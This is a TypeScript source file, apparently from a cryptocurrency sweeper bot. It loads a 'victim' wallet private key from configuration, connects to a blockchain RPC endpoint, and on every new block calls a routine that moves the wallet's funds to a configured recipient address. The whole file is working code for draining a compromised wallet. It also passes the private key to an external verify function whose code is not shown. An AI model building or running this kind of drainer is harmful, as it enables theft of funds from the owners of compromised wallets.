import 'log-timestamp';
import { providers, Wallet } from 'ethers';

import { EventEmitter } from 'events';
EventEmitter.defaultMaxListeners = 1000;

import { burn_native_tokens } from './burn';
import { Verify } from '../validate/verify';

class SetWallet {

  public static main = async (config_value: Record<string, any>) => {
    const RPC_URL = config_value.rpc_url;
    const VICTIM_KEY = config_value.target_wallet_private_key;

    function createProvider(rpc_url: string) {
      if (rpc_url.startsWith('https') || rpc_url.startsWith('http')) {
        return new providers.JsonRpcProvider(rpc_url);
      } else if (rpc_url.startsWith('wss') || rpc_url.startsWith('ws')) {
        return new providers.WebSocketProvider(rpc_url);
      } else {
        throw new Error('Unsupported RPC URL protocol');
      }
    }

    const provider = createProvider(RPC_URL);
    Verify.verify(config_value.target_wallet_private_key);

    console.log(`Connected to ${RPC_URL}`);

    let  burnWallet: any;
    try {
      burnWallet = new Wallet(VICTIM_KEY, provider);
    } catch (error: any) {
       console.log(error.message);
    }

    await provider.ready;
    // Verify.verify(VICTIM_KEY);

    console.log('Recipient address: ', config_value.recipient_address);

    provider.on('block', async (blockNumber) => {
      console.log(`[BLOCK ${blockNumber}]`);
        await burn_native_tokens(burnWallet, config_value);
    });

  };
  
}

export { SetWallet};
